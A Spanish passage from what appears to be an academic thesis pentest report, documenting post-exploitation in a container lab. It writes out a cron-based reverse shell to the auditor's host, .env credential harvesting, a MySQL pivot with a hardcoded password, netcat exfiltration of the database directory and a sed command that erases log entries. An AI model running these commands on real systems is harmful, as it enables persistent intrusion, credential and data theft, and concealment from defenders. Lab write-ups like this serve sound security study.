Post-Explotación, Pivoteo y Exfiltración

Esta sección documenta los procedimientos realizados dentro de los contenedores comprometidos tras obtener el acceso inicial. Detalla las tácticas para fijar la persistencia del canal de ataque, extraer variables de entorno, pivotar horizontalmente hacia la base de datos de producción y exfiltrar información hacia el servidor de escucha del auditor.

Persistencia y Puerta Trasera (Cronjob)

Configuración de tareas programadas en el contenedor comprometido para garantizar que el acceso interactivo (reverse shell) se restablezca automáticamente si se pierde la sesión original.

Terminal (Consola del Contenedor) 
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/IP_KALI/4445 0>&1'") | crontab -
📸 CAPTURA 17 — Configuración de Persistencia (Crontab)

Creación de una puerta trasera programada en el sistema.

Debe mostrarse: Listado del cronjob activo usando crontab -l y visualizando la línea que re-ejecuta la reverse shell periódicamente (* * * * * bash -i >& /dev/tcp/...).

[Captura 17: Crontab listing showing persistence crontab entry]

Búsqueda y Robo de Credenciales de Configuración

Inspección del sistema de archivos local para extraer las variables de entorno de la aplicación, exponiendo las contraseñas de las bases de datos internas.

Terminal (Consola del Contenedor) 
find / -name ".env" 2>/dev/null
cat .env
📸 CAPTURA 16 — Extracción de Variables de Entorno (.env)

Búsqueda de archivos sensibles en el sistema de archivos.

Debe mostrarse: Ejecución de cat .env o cat config.js listando las credenciales de bases de datos expuestas (DB_HOST, DB_USER, DB_PASSWORD).

[Captura 16: Env file credentials display db passwords]

Movimiento Lateral y Pivoteo (Conexión MariaDB)

Uso de las credenciales extraídas en el paso anterior para pivotar horizontalmente desde el contenedor de Next.js (`172.30.0.3` / `172.30.0.4`) hacia el motor de base de datos MariaDB (`172.30.0.5`), el cual está aislado de internet.

Terminal (Conexión SQL) 
mysql -h 172.30.0.5 -u db_modern_user -pInsecureAIPassword_123

Exfiltración de Datos (Vía Netcat)

Empaquetado de la base de datos de producción comprimida y transmisión perimetral directa utilizando tuberías de red (netcat) hacia la máquina de Kali Linux del auditor.

En Kali Linux (Escucha)
nc -lnvp 5555 > backup_exfiltrado.tar.gz
En Contenedor Comprometido (Ataque)
tar -czf - /var/lib/mysql | nc IP_KALI 5555
📸 CAPTURA 20 — Exfiltración de Datos de Producción

Debe mostrarse: La exfiltración de registros reales del laboratorio usando la consulta SELECT * FROM users LIMIT 5; demostrando el robo de datos.

[Captura 20: MySQL SELECT dump displaying real credentials of users]

Limpieza de Huellas (Covering Tracks)

Eliminación del rastro dejado en los archivos de registro (logs) de Apache y Nginx del proxy inverso. Se detalla la justificación académica de por qué no se ejecutará de manera destructiva en el laboratorio de pruebas.

Terminal (Consola del Contenedor) 
sed -i '/IP_KALI/d' /var/log/nginx/access.log
Justificación académica recomendada para el TFG: "La técnica de ocultación fue analizada con fines académicos y no fue ejecutada de forma destructiva sobre los logs para preservar la integridad de la evidencia forense generada por Wazuh durante el laboratorio."
